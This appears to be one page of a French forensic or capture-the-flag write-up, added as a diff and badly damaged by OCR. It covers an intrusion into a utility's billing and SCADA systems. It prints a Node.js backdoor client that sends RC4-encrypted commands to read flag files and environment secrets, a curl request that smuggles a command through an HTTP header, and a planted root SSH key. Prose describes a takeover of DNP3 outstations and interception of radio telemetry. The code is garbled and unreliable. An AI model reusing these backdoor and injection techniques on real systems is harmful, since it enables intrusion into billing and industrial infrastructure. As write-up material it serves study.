@@ -1,0 +1,43 @@
+Source locale : forensic/kissofdeath/ocr/p-014.txt
+Copie documentaire expurgée ; les affirmations restent celles de la source.
+
+; $ CMD=$
+(echo -n ‘node /opt/tervabill/.sync-agent.js & sleep 1
+node -e
+const net=require(\"net\");
+const rc4=(k,d)=>{const S=[],K=Buffer.from(k);let 1,j=0,0=[]; for(i=0;i1<256;i++)S[i]=i; for(i
+=; 1<256; 14+) {j=(45+S[1]+K[i%K. Length] )%256;[S[i],S[5] J=[S[5],S[i]]}1=0; j=0;for(let kk=0;kk<
+d. Length; kk++) {1=(14+1)%256; j=(3+S[71] )%256; [S[i],S[3]]=[S[3],S[i]];0.push(d[kk]*S[(S[i]+S[j]
+)%256])}return Buffer. from(o)};
+const C=\"T3rv4Grid_C2_2026\";const D=\"SYNC/1 4417\";
+const run=(cmd,cb)=>{const c=net.connect(80,\"127.0.0.1\",()=>{c.write(D+\"\n\");setTimeout
+(()=>{c.write(rc4(C,Buffer.from(cmd)));c.on(\"data\" ,d=>{cb(rc4(C,d).toString());c.destroy(
+)3})},300)});c.on(\"error\",e=>cb(\"ERR: \"+e.message) )};
+run(\"envi|grep -i flag\",r=>{console.log(\"ENV:\",r);
+run(\"cat /opt/tervabill/flag 2>/dev/null;cat /flag 2>/dev/null;find / -maxdepth 3 -name fl
+ag 2>/dev/null\",r2=>{console. Log(\"FILES:\",r2);process.exit(0)})});
+
+2>&1 tail -10 base64 -w0)
+
+curl -s http://172.28.38.2:3001/ -H "x-tervalog-trace: SCMD"
+ENV: FLAG=<EXPURGE>
+FILES: null
+Une backdoor SSH additionnelle a été découverte dans /root/.ssh/authorized_keys de billing-01 :
+ssh-ed25519 AAAAC3NzaC1IZDIINTE5AAAAIPzV6s/YfsfiPcgoxZik/obsdlotkKAmrgjJiKtuylhOnwm
+root@billing-01
+Fingerprint SHA-256 : SHA256:CXx3e+n531Rn1HO+knDpovHrvT 8uXmsbN3RcxUk5til
+Enfin, l'archive de backup billing-config-2026-05.tar.gz stockée sur backup01.tervagrid.trv contenait un ancien
+fichier .env.bak avec un token d'administration :
+ADMIN_API_TOKEN=<EXPURGE>
+Phase 6 : Prise de contrdle des outstations DNP3 (LiveWire)
+Chaque gateway SCADA est une outstation DNP3 pilotée sur tcp/20000. Depuis l'accés réseau OT établi en Phase
+4, le firmware du démon dnp3d a été rétro-ingénié (ELF x64), permettant a l'attaquant de prendre le contréle
+complet de la station billing-01. Cette prise de contrdle DNP3 est le préalable nécessaire a l'interception radio de la
+Phase 7 : c'est via l'accés complet a la gateway SCADA que l'attaquant a pu accéder au flux de télémétrie radio
+relayé sur le port TCP 40000.
+Phase 7 : Interception radio SCADA et exfiltration de la clé maitre (Background Noise),
+Derniére étape de la chaine, une fois le contréle complet de l'infrastructure SCADA établi : un flux audio brut
+transmis sur le port TCP 40000 de la gateway SCADA compromise dissimulait une communication de télémétrie
+radio encodée en AFSK 1200 baud (Bell 202, 8N1). L'analyse spectrale a révelé deux tonalités a environ 1200 Hz
+et 2200 Hz.
+Analyse spectrale (FFT) du flux AFSK 1200 baud
